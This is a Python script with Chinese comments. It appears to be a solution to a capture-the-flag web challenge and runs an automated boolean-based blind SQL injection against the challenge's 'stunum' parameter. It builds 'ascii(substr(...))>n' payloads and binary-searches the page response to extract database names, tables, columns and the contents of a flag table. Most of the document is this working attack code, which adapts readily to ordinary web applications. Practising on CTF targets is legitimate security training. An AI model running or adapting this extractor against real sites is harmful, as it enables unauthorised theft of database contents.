import sys
import time

import requests

def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = "0^"
    end_str = ""
    # 自定义SQL查询语句
    # select_str="select(version())" #limit "+ str(result_index) + ",1" 显示数据库、版本、用户名
    # 查询所有数据库名
    # select_str="select(group_concat(schema_name))from(information_schema.schemata)"#limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')"# limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"# limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    select_str="select(SUBSTRING((group_concat(flag,0x7e,value)),1))from(ctf.flag)"#limit "+str(result_index)+",1"
    # 连接payload
    sqli_str = "(ascii(substr((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload

def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://f2d1be60-55c3-479c-829e-a54d1cfbfc19.node3.buuoj.cn/?stunum="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查回显
    echo = "Hi admin, your score is: 100"
    content = requests.get(exec_url).text
    time.sleep(0.2)
    if echo in content:
        return True
    else:
        return False


def dichotomy(result_index, char_index, left, right):
    while left < right:
        # 二分法
        ascii = int((left + right) / 2)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            left = ascii
        else:
            right = ascii
        # 结束二分
        if left == right - 1:
            if execute(str(result_index), str(char_index + 1), str(ascii)):
                ascii += 1
                break
            else:
                break
    return chr(ascii)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(1000):  # 单条查询结果的长度
            count += 1
            char = dichotomy(num, len, 30, 126)
            if ord(char) == 31:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
